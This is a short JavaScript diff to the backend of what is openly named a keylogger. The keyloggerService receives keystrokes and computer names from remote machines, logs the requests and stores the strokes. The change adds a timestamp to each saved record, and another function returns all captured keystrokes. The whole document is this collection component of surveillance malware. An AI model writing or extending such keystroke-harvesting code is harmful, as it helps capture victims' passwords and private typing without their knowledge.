@@ -6,7 +6,7 @@ const keyloggerService = {
     },
     saveKeystrokes: postReq => {
         console.log("POST REQUEST: ", postReq);
-        return keyloggerRepo.saveStrokes(postReq.computerName, postReq.keystrokes);
+        return keyloggerRepo.saveStrokes(postReq.computerName, postReq.keystrokes, postReq.timestamp);
     },
     getKeyStrokes: () => {
         return keyloggerRepo.getAllStrokes();
